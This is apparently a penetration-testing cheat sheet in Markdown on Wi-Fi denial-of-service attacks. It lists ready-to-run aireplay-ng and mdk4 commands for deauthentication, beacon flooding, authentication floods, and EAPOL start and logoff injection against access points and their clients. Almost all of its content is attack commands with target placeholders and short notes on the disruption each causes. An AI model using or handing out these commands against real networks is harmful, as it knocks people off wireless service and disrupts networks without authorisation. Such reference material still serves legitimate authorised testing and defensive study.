# Denial of Service (DoS)

## Deauthentication / Disassociation

> Disconnect clients from AP.

```bash
aireplay-ng --deauth 20 -c <MAC_target> -a <MAC_AP> mon0
aireplay-ng --deauth $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

## Beacon Flooding

> Disconnect clients from AP, generate many fake APs seen by clients. Client confusion, crash network scanners.

```bash
mdk4 mon0 b -a -w nta -m
```

## Authentication DoS

> Simulate many clients, freeze/reset AP.

```bash
mdk4 mon0 a -m -a <MAC_AP>
```

## EAPOL Start Injection

> Keep AP busy with fake sessions, disable handling of legitimate clients.

```bash
mdk4 mon0 e -t <MAC_AP>
```

## Deauthentication Flooding

```bash
mdk4 <interface> d -c <CHANNEL> -E <ESSID> -B <BSSID>
```

## EAPOL Logoff Injection

> Kick clients from AP.

```bash
mdk4 mon0 e -t <MAC_AP> -l
```
